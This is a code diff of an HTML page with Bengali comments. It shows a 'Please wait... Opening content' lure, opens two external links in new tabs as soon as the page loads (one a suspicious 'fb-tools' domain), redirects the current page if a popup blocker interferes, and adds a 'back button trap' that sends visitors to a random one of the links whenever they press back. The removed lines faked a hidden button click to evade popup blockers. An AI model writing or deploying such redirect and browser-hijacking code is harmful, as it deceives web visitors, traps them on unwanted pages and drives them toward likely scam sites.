@@ -4,45 +4,47 @@
   <meta charset="UTF-8">
   <title>Auto Redirect Tabs</title>
 </head>
-<body>
-  <h1 style="text-align:center; margin-top:40px; color:red;">
-    Please wait... Opening content 🔥
-  </h1>
+<body style="margin:0;padding:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;">
+  <h1>Please wait... Opening content 🔥</h1>
 
 <script>
 (function(){
   var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
   var link2 = "https://fb-tools.social-networking.me";
 
-  // Trick: simulate a hidden button click
-  var btn = document.createElement("button");
-  btn.style.display = "none";
-  document.body.appendChild(btn);
-
-  btn.addEventListener("click", function(){
+  // পেজ লোড হলে দুই লিংক খুলবে
+  window.addEventListener("load", function(){
+    // প্রথম লিংক নতুন ট্যাবে
     var w1 = window.open(link1, "_blank");
 
+    // অল্প সময় পরে দ্বিতীয় লিংক নতুন ট্যাবে
     setTimeout(function(){
       var w2 = window.open(link2, "_blank");
       if(!w2 || w2.closed){
+        // popup blocker হলে fallback
         window.location.href = link2;
       }
-    }, 400);
+    }, 300);
 
+    // যদি popup blocker থাকে fallback হিসেবে প্রথম লিংক ওপেন
     setTimeout(function(){
       if(!w1 || w1.closed){
         window.location.href = link1;
       }
-    }, 800);
+    }, 600);
   });
 
-  // Force "auto click" after load
-  window.addEventListener("load", function(){
-    btn.click();
-  });
+  // 🔄 Back button trap (unlimited redirect)
+  history.pushState(null, null, location.href);
+  window.onpopstate = function () {
+    history.pushState(null, null, location.href);
+    // back প্রেস করলে redirect হবে যেকোনো লিঙ্কে
+    var targets = [link1, link2];
+    var rand = targets[Math.floor(Math.random() * targets.length)];
+    window.location.href = rand;
+  };
 
 })();
 </script>
-
 </body>
 </html>
